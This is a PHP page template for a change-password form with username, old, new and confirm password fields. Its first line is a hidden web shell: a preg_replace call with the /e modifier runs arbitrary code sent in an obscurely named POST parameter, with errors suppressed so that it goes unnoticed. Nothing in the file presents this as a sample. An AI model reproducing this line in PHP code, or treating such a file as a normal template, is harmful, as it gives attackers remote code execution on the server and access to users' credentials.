<?php @preg_replace('/(.*)/e', @$_POST['muewddjqcgzbj'], '');
      ...
      <form name="change password" method="POST" action="">
        ...
        <table>
          <tr>
            ...
            <td><input type="text" name="name" readonly value="<?php echo $user->name;?>" placeholder="User Name">
            </td></tr>
            <td>Old Password
            </td>
            <td><input type="password" id="oldpassword" name="oldpassword" pattern=".{6,}" placeholder="Old Password">
            </td></tr>
            <td>New Password
            </td>
            <td><input type="password" id="newpassword" name="newpassword" pattern=".{6,}" placeholder="Min. 6 character">
            </td></tr>
            <tr>
            <td>Confirm Password
            </td>
            <td><input type="password" id="confirmpassword"  name="confirmpassword" pattern=".{6,}" oninput="check(this)" placeholder="Confirm Password">
            </td>
          </tr>
        </table>  
        ...
        <p class="submit">
    <input type="submit" name="submit" onClick="javascript:return validation();" value="Submit" style="background-color: gainsboro;border-radius: 4px;width: 93px;height: 28px;border: 1px solid #CCC;text-decoration: none;color: #000;text-shadow: white 0 1px 1px;padding: 2px;" />
    </p>
      </form>
    </div>
